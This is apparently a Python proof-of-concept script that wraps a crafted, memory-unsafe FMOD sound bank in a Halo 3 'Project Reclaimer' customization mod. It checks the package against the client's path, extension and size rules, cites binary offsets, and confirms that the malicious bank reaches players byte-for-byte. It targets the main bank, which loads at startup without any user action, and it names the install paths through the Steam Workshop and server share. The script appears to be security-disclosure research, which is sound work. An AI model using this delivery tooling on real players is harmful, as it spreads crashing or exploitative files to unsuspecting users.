#!/usr/bin/env python3
"""
modpack.py — package a crafted FSB as a Project Reclaimer customization mod and
check it against the client's shareable-file acceptance rules, to prove a
malicious sound bank survives being served to a player unchanged.

A Reclaimer "mod" is NOT a single packed file: it is a folder tree (a Steam
Workshop item for app 976730, or the same files a `share_mods` server hands out).
Sound banks live as plain files at `halo3/fmod/pc/sfx*.fsb` next to `ModInfo.json`.
The client verifies each delivered file's SHA-256 against the server manifest
(integrity, not safety) and applies only an extension/size/path allow-filter — it
never inspects or transcodes the `.fsb` content. So the exact bytes that crash
FMOD are the exact bytes delivered to and opened by the player.

Rules implemented below are from shim/docs/mod-files-security.md (binary offsets
cited inline): server-share path rules exe+0x1886be0/0x1888030, size caps
exe+0x1888d70, dedicated-server install allowlist exe+0xa2c4b0, FMOD bank-name
redirect type 3 exe+0xa48d90 (name parts [A-Za-z0-9_-]).
"""
import os, sys, json, hashlib, struct

SRC_FSB = sys.argv[1]                      # crafted PoC .fsb
OUT     = sys.argv[2]                      # mod folder to create
WORKSHOP_ID = 3820687243                   # arbitrary demo id
BANK_NAME = "sfx.fsb"                      # the MAIN bank: opened at init, no map/user action

RESERVED = {"CON","PRN","AUX","NUL"} | {"COM%d"%i for i in range(1,10)} | {"LPT%d"%i for i in range(1,10)}
PART_OK  = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ()-._")
SIZE_CAPS = {".fsb": 2*1024**3, ".fsb.info": 16*1024**2, ".map": 4*1024**3, ".bik": 2*1024**3}
EXT_ALLOW = {".map",".mapinfo",".json",".png",".jpg",".jpeg",".fsb",".fsb.info",".bik",".bin",".mvar"}

def check_share_path(relpath, size):
    reasons = []
    b = relpath.encode()
    if not (1 <= len(b) <= 200): reasons.append("path length not in 1..200 (exe+0x1886be0)")
    parts = relpath.split("/")
    if not (1 <= len(parts) <= 4): reasons.append("not 1..4 '/'-separated parts (exe+0x1886be0)")
    for p in parts:
        if not (1 <= len(p) <= 96): reasons.append("part %r not 1..96 chars" % p)
        if any(c not in PART_OK for c in p): reasons.append("part %r has disallowed chars" % p)
        if p in (".",".."): reasons.append("traversal part %r" % p)
        if p.rstrip() != p or p.endswith("."): reasons.append("part %r trailing space/dot" % p)
        stem = p.split(".")[0].upper()
        if stem in RESERVED: reasons.append("reserved name %r" % p)
    low = relpath.lower()
    ext = ".fsb.info" if low.endswith(".fsb.info") else os.path.splitext(low)[1]
    if ext not in EXT_ALLOW: reasons.append("extension %r not in dedicated-server allowlist (exe+0xa2c4b0)" % ext)
    cap = SIZE_CAPS.get(ext)
    if cap is not None and size > cap: reasons.append("size %d exceeds cap %d for %s (exe+0x1888d70)" % (size, cap, ext))
    return (not reasons), reasons, ext

def check_bank_name(bankstem):
    # redirect type 3 (exe+0xa48d90): sfx[.<name>]; name parts [A-Za-z0-9_-], no traversal
    ok = all(c in set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-.") for c in bankstem)
    return ok

def main():
    data = open(SRC_FSB, "rb").read()
    rel = "halo3/fmod/pc/%s" % BANK_NAME
    dst = os.path.join(OUT, rel)
    os.makedirs(os.path.dirname(dst), exist_ok=True)
    with open(dst, "wb") as f: f.write(data)                 # byte-for-byte copy -> the mod payload

    modinfo = {
        "ModIdentifier": {"ModGuid": "00000000-0000-4000-8000-feedface0001",
                          "HostedModIds": {"SteamWorkshopId": WORKSHOP_ID}},
        "ModVersion": {"Major": 0, "Minor": 0, "Patch": 1},
        "Engine": "Halo3",
        "Title": {"Neutral": "PoC Sound Pack (FSB5 memory-safety demo)"},
        "Description": {"Neutral": "Demonstration customization mod: replaces the main FMOD sound bank."},
        "InheritSharedFiles": "FromMCC",
        "ModContents": {"HasBackgroundVideos": False, "HasNameplates": False},
    }
    with open(os.path.join(OUT, "ModInfo.json"), "w") as f: json.dump(modinfo, f, indent=2)

    # the server manifest the client checks against: per-file SHA-256 + size (integrity only)
    sha = hashlib.sha256(data).hexdigest()
    manifest = {"title": modinfo["Title"]["Neutral"], "shared": True,
                "files": [{"path": rel, "size": len(data), "digest": "sha256:" + sha}]}
    with open(os.path.join(OUT, "server-manifest.json"), "w") as f: json.dump(manifest, f, indent=2)

    print("=== demonstration customization mod built at: %s ===" % OUT)
    for dp,_,fs in os.walk(OUT):
        for fn in sorted(fs):
            p = os.path.join(dp,fn); print("   %8d  %s" % (os.path.getsize(p), os.path.relpath(p, OUT)))

    ok, reasons, ext = check_share_path(rel, len(data))
    nm_ok = check_bank_name(os.path.splitext(BANK_NAME)[0])
    print("\n=== client shareable-file acceptance (shim/docs/mod-files-security.md) ===")
    print("   path            : %s" % rel)
    print("   extension       : %s  (allowlisted: %s)" % (ext, ext in EXT_ALLOW))
    print("   size            : %d bytes  (cap for %s: %d)" % (len(data), ext, SIZE_CAPS.get(ext,0)))
    print("   path rules       : %s" % ("PASS" if ok else "FAIL: " + "; ".join(reasons)))
    print("   bank-name redirect (type 3, exe+0xa48d90): %s" % ("PASS" if nm_ok else "FAIL"))
    print("   manifest digest  : sha256:%s" % sha)
    print("\n   VERDICT: %s" % ("ACCEPTED — delivered byte-for-byte to the player; no content check, no transcode"
                                if (ok and nm_ok) else "REJECTED"))
    # prove byte identity source -> installed payload
    inst = open(dst,"rb").read()
    print("   payload == source crafted FSB: %s (sha256 %s)"
          % (hashlib.sha256(inst).hexdigest()==sha, "match" if hashlib.sha256(inst).hexdigest()==sha else "DIFFER"))
    print("\n   bank install path (loader prefix):")
    print("   .../ReclaimerContent/Mods/Downloaded/%d/%s   (server share), or" % (WORKSHOP_ID, rel))
    print("   .../steamapps/workshop/content/976730/%d/%s   (Workshop)" % (WORKSHOP_ID, rel))
    print("   -> halo3+0x172fc8 builds fmod\\pc\\%s, opens via createStream(0x2080,NULL) at halo3+0x460b60" % BANK_NAME)

if __name__ == "__main__":
    main()
